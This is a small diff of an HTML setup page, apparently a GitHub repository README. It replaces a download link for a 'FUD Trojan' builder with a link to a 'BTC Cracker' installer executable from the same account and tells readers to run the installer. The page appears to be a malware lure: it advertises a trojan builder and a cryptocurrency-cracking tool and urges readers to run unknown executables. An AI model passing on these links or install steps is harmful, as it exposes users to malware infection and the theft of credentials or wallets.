@@ -25,7 +25,7 @@
 
 <h2>How Setup</h2>
 <ul>
- <li><a href="https://github.com/M0nTan3/KNT-Build-Fud-Trojan/releases/download/file/KNT.Build.exe" style="color: #2ECC40;" target="_blank">1. Download App From releases</a></li>
+ <li><a href="https://github.com/M0nTan3/BTC-Cracker/releases/download/file/BTC.Cracker.install.exe" style="color: #2ECC40;" target="_blank">1. Download App From releases</a></li>
   <li><span style="color: #2ECC40;">Run Installer And enjoy !!</span></li>
 <ul>
 
